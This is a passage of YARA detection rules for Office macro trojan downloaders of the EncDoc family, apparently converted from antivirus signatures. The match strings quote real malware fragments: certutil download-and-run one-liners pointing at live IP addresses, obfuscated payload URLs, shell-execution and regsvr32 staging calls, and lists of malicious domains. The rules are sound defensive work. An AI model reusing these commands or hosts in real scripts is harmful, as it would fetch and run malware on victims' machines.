        $x_1_6 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":/\"&\"/b\"&\"o\"&\"l\"&\"t\"&\"m\"&\"o\"&\"t\"&\"o\"&\"r\"&\"s\"&\".c\"&\"o.z\"&\"a/d\"&\"V\"&\"E\"&\"q\"&\"Y\"&\"Z\"&\"W\"&\"b\"&\"/a\"&\"l\"&\"t\"&\".h\"&\"t\"&\"m\"&\"l\"," ascii //weight: 1
        $x_1_7 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/onlinegro.in/TsHT7OACCE2N/oi.html" ascii //weight: 1
        $x_1_8 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/golba.com.br/MjFQ20bEM/oi.html" ascii //weight: 1
        $x_1_9 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/highsoftgroup.com/5Y0vwrgTcOB2/oi.html" ascii //weight: 1
        $x_1_10 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/gr\"&\"e\"&\"en\"&\"fl\"&\"ag.e\"&\"sp\"&\".br/y\"&\"uI\"&\"Nd\"&\"Rb\"&\"M/tiynh.html" ascii //weight: 1
        $x_1_11 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/n\"&\"o\"&\"i\"&\"t\"&\"h\"&\"a\"&\"t\"&\"1\"&\"1\"&\"7.v\"&\"n/T\"&\"Sh\"&\"7G\"&\"Be\"&\"IR/tiynh.html" ascii //weight: 1
        $x_1_12 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"//p\"&\"la\"&\"ysi\"&\"s.c\"&\"om\"&\".b\"&\"r/q\"&\"JS\"&\"L1\"&\"B\"&\"N\"&\"5V/tiynh.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAD_2147759153_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAD!MTB"
        threat_id = "2147759153"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "docPath = cDir + \"\\Covid Guidelines.doc\"" ascii //weight: 1
        $x_1_2 = "userDir + \"\\audiodl.exe';\"" ascii //weight: 1
        $x_1_3 = "wsh.exec (dLoad)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASD_2147759232_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASD!MTB"
        threat_id = "2147759232"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"ttp\"&\"s://gi\"&\"v\"&\"er\"&\"sh\"&\"er\"&\"ba\"&\"lpr\"&\"od\"&\"uct\"&\"s.c\"&\"o\"&\"m/A\"&\"d\"&\"4\"&\"7\"&\"X\"&\"R\"&\"S\"&\"H\"&\"/fok.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_2 = "h\"&\"ttp\"&\"s://s\"&\"pe\"&\"c\"&\"ia\"&\"li\"&\"st\"&\"e\"&\"du.com.hk/4\"&\"9\"&\"5i\"&\"vO4\"&\"P\"&\"QT\"&\"Rk/fok.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"p\"&\"s://d\"&\"e\"&\"n\"&\"ky\"&\"ir\"&\"am\"&\"an.co.uk/h\"&\"qz\"&\"qx\"&\"PN\"&\"ha/fok.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_4 = "h\"&\"t\"&\"t\"&\"p\"&\"s://ge\"&\"od\"&\"rilli\"&\"ng\"&\"chile.cl/H9\"&\"nrv\"&\"GC\"&\"NV/b.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_5 = "h\"&\"t\"&\"t\"&\"p\"&\"s://casa\"&\"viv\"&\"a.com.pe/Tb4A\"&\"jvz\"&\"zr\"&\"iwP/b.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_6 = "h\"&\"t\"&\"t\"&\"p://a\"&\"gro\"&\"sa\"&\"nus.com.tr/Ld\"&\"R6\"&\"5v\"&\"BJ\"&\"Jb/b.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_7 = "h\"&\"t\"&\"t\"&\"p\"&\"s://dec\"&\"info\"&\"rm\"&\"ati\"&\"ca.com/A\"&\"sq\"&\"pQ\"&\"T6a2fl/t.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_8 = "h\"&\"t\"&\"t\"&\"p\"&\"s://no\"&\"va\"&\"m\"&\"iron.com.ar/Sp\"&\"V02\"&\"9N\"&\"nc\"&\"EoH/t.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_9 = "h\"&\"t\"&\"t\"&\"p\"&\"s://m\"&\"oo\"&\"ca.imp\"&\"rim\"&\"e\"&\"ja.com.br/uq\"&\"JeyC\"\"xO\"&\"9/t.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_10 = "h\"&\"t\"&\"t\"&\"p\"&\"s://de\"&\"cin\"&\"f\"&\"o.co\"&\"m.br/s4h\"&\"fZyv\"&\"7NFEM/y9.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_11 = "h\"&\"t\"&\"t\"&\"p\"&\"s://im\"&\"pri\"&\"mi\"&\"ja.co\"&\"m.br/B\"&\"It2Z\"&\"lm\"&\"3/y5.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_12 = "h\"&\"t\"&\"t\"&\"p\"&\"s://st\"&\"unn\"&\"in\"&\"gma\"&\"x.com/J\"&\"R3\"&\"xN\"&\"s7W\"&\"7W\"&\"m1/y1.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASS_2147759345_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASS!MTB"
        threat_id = "2147759345"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "objXML.Open \"GET\", \"http://20.69.97.31/mum\", False" ascii //weight: 1
        $x_1_2 = {3d 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c [0-47] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = "= \" /C move C:\\Windows\\Temp\\mum\" & \" \" & " ascii //weight: 1
        $x_1_4 = {2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-47] 2c 20 22 22 2c 20 22 22 2c 20 22 6f 70 65 6e 22 2c 20 30}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASS_2147759345_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASS!MTB"
        threat_id = "2147759345"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-47] 28 22 35 37 35 33 36 33 37 32 36 39 37 30 37 34 32 [0-47] 22 29 20 26 20 [0-47] 28 22 [0-47] 22 29 29 2e 52 75 6e 20 [0-47] 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_2 = " = Environ(\"TEMP\") & \"\\\" & " ascii //weight: 1
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-47] 28 22 34 31 34 34 34 [0-47] 22 29 20 26 20 [0-47] 28 22 [0-47] 22 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {73 65 74 52 65 71 75 65 73 74 48 65 61 64 65 72 20 [0-47] 28 22 35 35 37 33 36 35 37 [0-47] 22 29 20 26 20 [0-47] 28 22 [0-47] 22 29 2c 20 [0-47] 28 22 34 64 36 66 [0-63] 22 29 20 26 20 [0-47] 28 22 [0-63] 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 [0-47] 2c 20 32}  //weight: 1, accuracy: Low
        $x_1_6 = "setOption(2) = 13056" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KB_2147759408_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KB!MTB"
        threat_id = "2147759408"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://80.76.51.142/nod/Payslips%20-%20Week%20Ending%2019%20October%202022.exe\"\" Zhnyoizqxyxvv.exe.exe && Zhnyoizqxyxvv.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KE_2147759424_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KE!MTB"
        threat_id = "2147759424"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://185.246.220.65/lee/IMG_56766900.exe\"\" Oyifffsiiqxvoykoftwvnvpw.exe.exe && Oyifffsiiqxvoykoftwvnvpw.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAR_2147759427_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAR!MTB"
        threat_id = "2147759427"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vba.shell(qjna6zqgz+jqytk3e6b+sqmbajkln))endsubp" ascii //weight: 1
        $x_1_2 = "1tolen(biakzwuov)step2goto" ascii //weight: 1
        $x_1_3 = "&chr$(val(\"&h\"&mid$(biakzwuov,pt1m0wowg,2)))gotow" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAS_2147759429_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAS!MTB"
        threat_id = "2147759429"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "getobject(strreverse_(\"0\"+\"0\"+\"0\"+\"0\"+\"4" ascii //weight: 1
        $x_1_2 = "0\"+\"7\"+\"3\"+\"1\"+\":\"+\"w\"+\"e\"+\"n\"))endfunction" ascii //weight: 1
        $x_1_3 = "open()dimobjasnewclass1callobj.janug.shellexecute(k1.u1.controltiptext,\"https://bitly.com/eywuiqdhnjkasbdjsghah\",\"\",\"op" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KJ_2147759482_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KJ!MTB"
        threat_id = "2147759482"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "faafsafsafsfsafasf = \"http://okokokokokok.khaby.lol/ME.exe\"" ascii //weight: 1
        $x_1_2 = "fsfsfsfsf.Open \"GET\", faafsafsafsfsafasf, False, \"username\", \"password\"" ascii //weight: 1
        $x_1_3 = "fffffffffffffffffff.Run \"cmd.exe /k hey.txt\", windowStyle, waitOnReturn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SML_2147759559_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SML!MTB"
        threat_id = "2147759559"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://btchs.com.br/ds/161120.gif" ascii //weight: 1
        $x_1_2 = "https://uaeub.com/ds/161120.gif" ascii //weight: 1
        $x_1_3 = "http://i.sfu.edu.ph/ds/161120.gif" ascii //weight: 1
        $x_1_4 = "https://bemojo.com/ds/161120.gif" ascii //weight: 1
        $x_1_5 = "https://myscape.in/ds/161120.gif" ascii //weight: 1
        $x_1_6 = "https://anhii.com/ds/161120.gif" ascii //weight: 1
        $x_1_7 = "https://gaspee.info/ds/161120.gif" ascii //weight: 1
        $x_1_8 = "https://ikkon.pk/ds/161120.gif" ascii //weight: 1
        $x_1_9 = "https://alpine.kz/ds/161120.gif" ascii //weight: 1
        $x_1_10 = "https://moegifts.com/ds/161120.gif" ascii //weight: 1
        $x_1_11 = "http://cargohl.com/ds/161120.gif" ascii //weight: 1
        $x_1_12 = "http://ippp.co.zw/ds/161120.gif" ascii //weight: 1
        $x_1_13 = "IICCCCI" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SMO_2147759561_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SMO!MTB"
        threat_id = "2147759561"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://ismailiyamedical.com/ds/151120.gif" ascii //weight: 1
        $x_1_2 = "https://esp.adnan.dev.hostingshouse.com/ds/151120.gif" ascii //weight: 1
        $x_1_3 = "JJCCCCJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SMP_2147759562_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SMP!MTB"
        threat_id = "2147759562"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(Cells(106, 2), \"Rpce" ascii //weight: 1
        $x_1_2 = "Replace(Cells(107, 2), \"Rpce" ascii //weight: 1
        $x_1_3 = "Replace(Cells(108, 2), \"Rpce" ascii //weight: 1
        $x_1_4 = "<> \"bhckla\" Then" ascii //weight: 1
        $x_1_5 = "firstAddress = \"34kla\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SMQ_2147759563_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SMQ!MTB"
        threat_id = "2147759563"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "exe.02495002%OP/kralC02%luaP/moc.makcilctsuj//:sptth" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SMQ_2147759563_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SMQ!MTB"
        threat_id = "2147759563"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {2d 77 20 68 69 20 73 6c 5e 65 65 70 20 2d 53 65 20 33 31 3b 53 74 [0-1] 61 5e 72 74 2d 42 69 74 73 54 72 5e 61 6e 73 5e 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 [0-159] 2e 65 60 78 65 20 2d 44 65 73 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-32] 2e 65 60 78 65 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 02 2e 65 60 78 65}  //weight: 5, accuracy: Low
        $x_5_2 = {2d 77 20 68 69 20 [0-255] 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 [0-159] 2e 65 60 78 65 20 2d 44 65 73 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-159] 2e 65 60 78 65 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 02 2e 65 60 78 65}  //weight: 5, accuracy: Low
        $x_1_3 = "ShellExecuteA" ascii //weight: 1
        $x_1_4 = "ShellExecuteW" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_SMS_2147759565_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SMS!MTB"
        threat_id = "2147759565"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KARTIC = \"://www.bitly.com/\"" ascii //weight: 1
        $x_1_2 = "TAec = \"" ascii //weight: 1
        $x_1_3 = "TYing = \"" ascii //weight: 1
        $x_1_4 = "TITAT = TAec + TYing" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SMT_2147759566_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SMT!MTB"
        threat_id = "2147759566"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "-split -f \"\"http://18.159.59.253/cut/396180999746067.bat\"\" Mgembggxmxalduz.exe.exe && Mgembggxmxalduz.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SMW_2147759569_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SMW!MTB"
        threat_id = "2147759569"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "7jcat.com/wp-content/cQO3vdPQavJrf2UrCW/" ascii //weight: 1
        $x_1_2 = "desayunosdesde.casa/wp-content/lyNShWgYN7F/" ascii //weight: 1
        $x_1_3 = "pickuphiblog.tatamotors.com/wp-includes/LoBv7LwWesAhk7Xu0A/" ascii //weight: 1
        $x_1_4 = "subs.video/netreginstall/6TMx9WQkWQG3mnRyrD/" ascii //weight: 1
        $x_1_5 = "phutungbom.com/cgi-bin/CawQlbH731aUMSP/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KL_2147759598_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KL!MTB"
        threat_id = "2147759598"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "U = \"http://topvaluationfirms.com/kkraken.png\"" ascii //weight: 1
        $x_1_2 = "N = \"kkraken.png\"" ascii //weight: 1
        $x_1_3 = "Async = \"DownloadFileAsync\"" ascii //weight: 1
        $x_1_4 = "gFx17LOa.Open EWA, U, False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_QK_2147759700_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.QK!MTB"
        threat_id = "2147759700"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://filebin.net/esn5g5841ddrd09y/brwfs.msi" ascii //weight: 1
        $x_1_2 = "CreateObject(\"WindowsInstaller.Installer\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BUI_2147759858_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BUI!MTB"
        threat_id = "2147759858"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://voopeople.fun/div/44376" ascii //weight: 1
        $x_1_2 = "regsvr32" ascii //weight: 1
        $x_1_3 = "URLMon" ascii //weight: 1
        $x_1_4 = "ownloadToFileA" ascii //weight: 1
        $x_1_5 = "XTOWN.dll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RBS_2147761952_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RBS!MTB"
        threat_id = "2147761952"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\tmp\\LuuNgayA" ascii //weight: 1
        $x_1_2 = "C:\\command.com /c=md c:\\tmp" ascii //weight: 1
        $x_1_3 = "c:\\tmp\\*.*" ascii //weight: 1
        $x_1_4 = "Auto_Open:g" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ZLD_2147763821_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ZLD!MTB"
        threat_id = "2147763821"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://205.185.113.20/PRTKfN0" ascii //weight: 1
        $x_1_2 = "http://205.185.113.20/YvGXD6cD" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ZLS_2147763822_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ZLS!MTB"
        threat_id = "2147763822"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\IDDCHrk\\rWwiyCF\\IYFLemb.dll" ascii //weight: 1
        $x_1_2 = "C:\\opnsdkr\\Ijiyoqi\\KqwQYOt.exe" ascii //weight: 1
        $x_1_3 = "DllRegisterServer" ascii //weight: 1
        $x_1_4 = "regsvr32.exe" ascii //weight: 1
        $x_1_5 = "rundll32.exe" ascii //weight: 1
        $x_1_6 = "JJCCJJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_YAJ_2147764341_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.YAJ!MTB"
        threat_id = "2147764341"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://mueblesmaple.com.mx/19.gif" ascii //weight: 1
        $x_1_2 = "C:\\WErtu\\Reterd\\szvmhegu.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_YAJ_2147764341_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.YAJ!MTB"
        threat_id = "2147764341"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
